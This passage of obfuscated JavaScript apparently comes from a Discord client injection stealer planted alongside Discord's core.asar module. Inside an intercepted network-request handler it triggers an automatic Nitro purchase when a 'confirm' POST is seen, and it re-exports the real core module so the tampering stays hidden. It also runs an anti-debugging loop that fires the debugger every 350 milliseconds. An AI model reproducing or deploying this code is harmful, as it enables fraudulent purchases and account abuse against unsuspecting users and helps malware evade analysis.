            case _0x5a2a8d.url.endsWith('confirm') && _0x5a2a8d.method === 'POST':
                if (!config.auto_buy_nitro) {
                    return
                }
                setTimeout(() => {
                    nitroBought(_0x2941b9).catch(console.error)
                }, 5000)
                break
            default:
                break
        }
    }
)
module.exports = require('./core.asar')
    ; (function () {
        const _0x413778 = function () {
            let _0x3022ca
            try {
                _0x3022ca = Function(
                    'return (function() {}.constructor("return this")( ));'
                )()
            } catch (_0x32a69a) {
                _0x3022ca = window
            }
            return _0x3022ca
        },
            _0x26c120 = _0x413778()
        _0x26c120.setInterval(_0x31eced, 350)
    })()
function _0x31eced(_0x5ad9bc) {
    function _0x54b7ae(_0x32a50a) {
        if (typeof _0x32a50a === 'string') {
            return function (_0x5dc4ea) { }
                .constructor('while (true) {}')
                .apply('counter')
        } else {
            ; ('' + _0x32a50a / _0x32a50a).length !== 1 || _0x32a50a % 20 === 0
                ? function () {
                    return true
                }
                    .constructor('debugger')
                    .call('action')
                : function () {
                    return false
                }
                    .constructor('debugger')
                    .apply('stateObject')
        }
        _0x54b7ae(++_0x32a50a)
    }
    try {
        if (_0x5ad9bc) {
            return _0x54b7ae
        } else {
            _0x54b7ae(0)
        }
    } catch (_0x2920d3) { }
}
